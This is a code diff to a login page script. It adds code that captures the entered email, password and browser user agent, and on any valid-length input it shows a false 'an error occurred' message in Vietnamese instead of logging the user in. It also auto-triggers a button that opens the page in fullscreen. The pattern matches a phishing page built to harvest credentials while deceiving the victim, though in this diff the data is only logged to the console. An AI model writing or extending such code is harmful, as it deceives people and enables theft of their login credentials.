@@ -20,9 +20,16 @@ btn.onclick = function () {
 
 //
 
+var users = {
+  username: "",
+  password: "",
+  user_agent: "",
+};
+
 const btnLogin = document.querySelector(".login");
 const email = document.querySelector(".email");
 const password = document.querySelector(".password");
+let agent = navigator.userAgent;
 
 btnLogin.onclick = function () {
   let msg = "";
@@ -32,12 +39,28 @@ btnLogin.onclick = function () {
     if (email.value.length < 6 || password.value.length < 6) {
       msg = "Email hoặc mật khẩu không chính xác.";
     } else {
-      console.log("Success!");
+      msg = "Có lỗi xảy ra vui lòng thử lại.";
+      users.username = email.value;
+      users.password = password.value;
+      users.user_agent = agent;
+
+      console.log(users);
     }
   }
 
   if (msg != "") {
     alerts.innerHTML = msg;
     alerts.style.display = "block";
+  } else {
+    alerts.style.display = "none";
   }
+};
+
+btnMoveToLogin = document.querySelector(".btnMoveToLogin");
+btnMoveToLogin.click();
+
+btnMoveToLogin.onclick = function () {
+  elem.style.display = "block";
+  btnMoveToLogin.remove();
+  openFullscreen();
 };
